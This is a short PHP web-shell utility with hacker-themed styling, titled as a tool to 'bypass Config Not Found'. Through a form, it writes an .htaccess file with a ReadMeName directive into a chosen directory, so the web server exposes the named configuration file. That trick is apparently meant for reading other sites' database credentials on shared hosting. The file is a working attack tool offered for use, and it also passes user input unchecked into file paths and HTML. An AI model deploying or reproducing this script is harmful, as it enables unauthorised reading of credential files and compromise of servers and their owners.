<html>
<head>
<style>
.myButton {
	background-color:#44c767;
	-moz-border-radius:23px;
	-webkit-border-radius:23px;
	border-radius:23px;
	border:1px solid #18ab29;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:15px;
	padding:5px 23px;
	text-decoration:none;
	text-shadow:0px -2px 15px #2f6627;
}
.myButton:hover {
	background-color:#5cbf2a;
}
.myButton:active {
	position:relative;
	top:1px;
}

body{
font-family: "courier new";
background-color: #2E0854	;
font-size:80%;
color: #28FE14;
background-image: url("http://www.hdwallpapers.in/walls/mr_robot_hd_4k_8k-HD.jpg) right bottom no-repeat, url(http://www.hdwallpapers.in/walls/mr_robot_hd_4k_8k-HD.jpg");
}

#phpinfo{
border: 1px solid #28FE14;
position:fixed;
padding:2px;
top:1px;
right:1px;
font-size:12px;
}
#copyright{
border: 1px solid #2E0854;
position:fixed;
bottom:1px;
left:1px;
padding:2px;
}
.auto-style6 {
	text-align: center;
}
.auto-style2 {
	text-align: center;
}

#phpinfo0{
border: 1px solid #FFFFFF;
position:fixed;
padding:2px;
top:1px;
right:1px;
background-color: #2E0854;
font-size:12px;
}

</style>
<meta content="text/html; charset=ISO-8859-1"
http-equiv="content-type">

	<title>bypass Config  Not Found ~ BY DanT3e</title>
</head>
<link rel="icon" href="http://i.imgur.com/NMYv5qo.png" type="image/x-icon">
</head>
<center><body style="background-color: black; color: rgb(0, 0, 0);"
alink="#ee0000" link="#0000ee" vlink="#551a8b">
<a href="http://www.reactiongifs.com/r/hhn.gif" target="_blank"><img src="http://vignette1.wikia.nocookie.net/zankyou-no-terror/images/e/ef/Twelvemc.png" style="opacity:0.4;filter:alpha(opacity=40)" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.4;this.filters.alpha.opacity=40" width="80px" ><br></a>
</big><br>
</div>
<big style="font-weight: bold; color: rgb(51, 204, 0);"><br>
</big>
<center>
<h1 style="font-size: 21px; ">bypass Config  Not Found ~ BY  DanT3e</h1>
<form method="GET">
<input  type="text" name="ficonf" placeholder="config Name" style="    width: 223px;
    height: 20px;"><br><br>
<input type="text" name="namef" placeholder="Name File config" style="    width: 223px;
    height: 20px;"><br><br>
        <input type="submit" name="submit" value="submit">
    height: 30px; "><br><br>
    <a href="https://www.facebook.com/ilyes.jemai.11">Click</a> 
</form>
</center>
</body>
</html>

<?
echo "<center>";
if(isset($_GET['submit'])){
	$ficonf = $_GET['ficonf'];
	$namef = $_GET['namef'];
	//////////////////////////////////
	$hta = fopen("$namef/.htaccess","w");
	$okhta = "ReadMeName $ficonf";
	fwrite($hta,$okhta);
	echo "<a href='$namef' target=_blank>$namef/$ficonf</a>";
	echo "</center>";
	}
?>